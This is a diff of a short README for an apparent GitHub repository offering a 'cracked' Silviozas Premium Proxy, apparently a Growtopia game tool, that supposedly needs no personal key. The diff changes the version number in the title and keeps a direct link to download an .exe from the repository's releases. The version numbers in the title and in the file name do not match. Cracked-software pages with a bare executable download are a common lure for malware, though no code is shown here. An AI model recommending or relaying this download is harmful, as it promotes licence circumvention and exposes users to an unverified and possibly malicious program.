@@ -1,4 +1,4 @@
-# 💥 Silviozas-Premium-Proxy-V3.857-CRACKED💥 
+# 💥 Silviozas-Premium-Proxy-V3.8592-CRACKED💥 
 Download [here](https://github.com/soustisaima/Silviozas-Premium-Proxy-V3.8592-CRACKED/releases/download/growtopia/Silviozas-Premium-Proxy-V3.85-CRACKED.exe)
 
 This is a cracked version of the Silviozas-Premium-Proxy, that doesn't require a personal key.
